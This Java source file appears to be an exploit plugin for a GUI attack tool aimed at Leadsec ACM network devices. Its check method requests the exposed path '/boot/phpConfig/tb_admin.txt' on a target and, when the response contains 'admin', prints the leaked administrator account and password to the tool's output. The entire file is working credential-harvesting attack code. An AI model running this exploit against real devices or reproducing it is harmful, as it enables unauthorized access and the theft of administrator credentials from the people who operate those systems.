package exp.equipment.wangyu;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class Leadsec_ACM_account implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞无法getshell");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea) {
        Response response = HttpTools.get(url + "/boot/phpConfig/tb_admin.txt", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains("admin")) {
            Platform.runLater(() -> {
                textArea.appendText("\n 漏洞存在 账号密码如下\n" + response.getText());
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n Leadsec_ACM_account-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }
}
